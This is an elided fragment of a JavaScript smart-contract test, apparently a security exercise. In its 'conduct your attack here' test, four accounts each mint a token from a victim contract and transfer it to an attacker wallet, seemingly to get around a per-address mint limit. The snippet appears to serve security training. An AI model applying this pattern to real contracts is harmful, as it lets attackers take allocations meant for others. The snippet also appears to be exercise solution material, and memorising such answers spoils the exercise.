...
describe(NAME, function () {
    ...
    describe("exploit", async function () {
        ...
        it("conduct your attack here", async function () {
            ...
            for (let i = 0; i < 4; i++) {
                await victimContract.connect(other[i]).mint();
                const id = await victimContract.totalSupply();
                await victimContract.connect(other[i]).transferFrom(other[i].address, attackerWallet.address, id);
            }
